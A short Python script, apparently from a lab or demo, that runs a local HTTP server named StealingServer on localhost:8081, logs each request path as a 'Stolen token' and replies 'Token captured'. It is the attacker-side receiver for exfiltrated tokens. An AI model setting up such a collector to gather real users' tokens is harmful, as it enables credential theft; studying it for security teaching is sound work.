from http.server import BaseHTTPRequestHandler, HTTPServer

class StealingServer(BaseHTTPRequestHandler):
    def do_GET(self):
        print("Stolen token:", self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Token captured")

server = HTTPServer(('localhost', 8081), StealingServer)
print("Attacker server running on http://localhost:8081")
server.serve_forever()
